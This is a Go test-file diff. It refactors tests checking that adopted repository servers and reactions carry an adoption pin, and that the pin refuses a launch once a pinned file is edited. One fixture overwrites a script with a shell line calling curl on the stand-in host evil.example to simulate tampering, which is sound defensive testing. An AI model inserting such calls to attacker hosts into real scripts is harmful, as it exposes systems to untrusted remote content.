@@ -1,6 +1,7 @@
 package config
 
 import (
+	"errors"
 	"os"
 	"path/filepath"
 	"reflect"
@@ -683,9 +684,9 @@ func TestAdoptedRepoReactionTakesParameterEditsLive(t *testing.T) {
 	}
 }
 
-// An adopted repo server carries its adoption pin to the MCP client's launch (ADR 0104 §4): the
-// Project root, the pinned project files — the program and a file an env value names — and a
-// Changed that names one of them once it is edited.
+// An adopted repo server carries its adoption pin to the MCP client's launch (ADR 0104 §4): its
+// Admit hands the launch the Project root and the pinned project files — the program and a file an
+// env value names — and refuses as moved, naming that file, once one of them is edited.
 func TestAdoptedRepoMCPServerCarriesItsPin(t *testing.T) {
 	t.Parallel()
 	globalPath, projectRoot := layerFixture(t, "",
@@ -709,26 +710,16 @@ func TestAdoptedRepoMCPServerCarriesItsPin(t *testing.T) {
 		t.Fatalf("MCPServers = %+v; want the adopted lint, carrying its pin", o.MCPServers)
 	}
 	pin := o.MCPServers[0].Pin
-	if pin.Root() != projectRoot {
-		t.Errorf("Root = %q; want the Project root %q", pin.Root(), projectRoot)
-	}
-	if got, want := pin.Programs(), []string{program, config}; !reflect.DeepEqual(got, want) {
-		t.Errorf("Programs = %q; want %q", got, want)
-	}
-	if changed, err := pin.Changed(); err != nil || len(changed) != 0 {
-		t.Errorf("Changed = %q, %v; want nothing before an edit", changed, err)
-	}
+	assertPinAdmits(t, pin, domain.PinLaunch{Dir: projectRoot, Programs: []string{program, config}})
 	if err := os.WriteFile(config, []byte("v2\n"), 0o700); err != nil {
 		t.Fatalf("edit the config: %v", err)
 	}
-	if changed, err := pin.Changed(); err != nil || !reflect.DeepEqual(changed, []string{"conf/lint.json"}) {
-		t.Errorf("Changed = %q, %v; want the edited env-named file named", changed, err)
-	}
+	assertPinMoved(t, pin, []string{"conf/lint.json"})
 }
 
-// An adopted repo reaction carries its adoption pin to the spawn (ADR 0104 §4): the Project root
-// it runs in, the pinned script as the one program it may run inside the fence, and a check that
-// names the script once its content moves.
+// An adopted repo reaction carries its adoption pin to the spawn (ADR 0104 §4): its Admit hands
+// the spawn the Project root it runs in and the pinned script as the one program it may run inside
+// the fence, and refuses as moved, naming the script, once its content moves.
 func TestAdoptedRepoReactionCarriesItsPin(t *testing.T) {
 	t.Parallel()
 	globalPath, projectRoot := layerFixture(t, "",
@@ -748,19 +739,34 @@ func TestAdoptedRepoReactionCarriesItsPin(t *testing.T) {
 		t.Fatalf("Reactions = %+v; want the adopted fmt, carrying its pin", o.Reactions)
 	}
 	pin := o.Reactions[0].Pin
-	if pin.Root() != projectRoot {
-		t.Errorf("Root = %q; want the Project root %q", pin.Root(), projectRoot)
-	}
-	if got := pin.Programs(); !reflect.DeepEqual(got, []string{script}) {
-		t.Errorf("Programs = %q; want the pinned script alone", got)
-	}
-	if changed, err := pin.Changed(); err != nil || len(changed) != 0 {
-		t.Errorf("Changed = %q, %v; want nothing before an edit", changed, err)
-	}
+	assertPinAdmits(t, pin, domain.PinLaunch{Dir: projectRoot, Programs: []string{script}})
 	if err := os.WriteFile(script, []byte("#!/bin/sh\ncurl evil.example\n"), 0o700); err != nil {
 		t.Fatalf("edit the script: %v", err)
 	}
-	if changed, err := pin.Changed(); err != nil || !reflect.DeepEqual(changed, []string{"scripts/fmt.sh"}) {
-		t.Errorf("Changed = %q, %v; want the edited script named", changed, err)
+	assertPinMoved(t, pin, []string{"scripts/fmt.sh"})
+}
+
+// assertPinAdmits fails the test unless pin admits its launch as want.
+func assertPinAdmits(t *testing.T, pin domain.ProjectPin, want domain.PinLaunch) {
+	t.Helper()
+	launch, err := pin.Admit()
+	if err != nil {
+		t.Fatalf("Admit before an edit: %v; want the launch admitted", err)
+	}
+	if !reflect.DeepEqual(launch, want) {
+		t.Errorf("Admit = %+v; want %+v", launch, want)
+	}
+}
+
+// assertPinMoved fails the test unless pin refuses its launch as moved, naming files.
+func assertPinMoved(t *testing.T, pin domain.ProjectPin, files []string) {
+	t.Helper()
+	_, err := pin.Admit()
+	var moved *domain.PinMovedError
+	if !errors.As(err, &moved) {
+		t.Fatalf("Admit after an edit = %v; want a *domain.PinMovedError", err)
+	}
+	if !reflect.DeepEqual(moved.Files, files) || moved.Err != nil {
+		t.Errorf("PinMovedError = {Files: %q, Err: %v}; want {Files: %q, Err: nil}", moved.Files, moved.Err, files)
 	}
 }
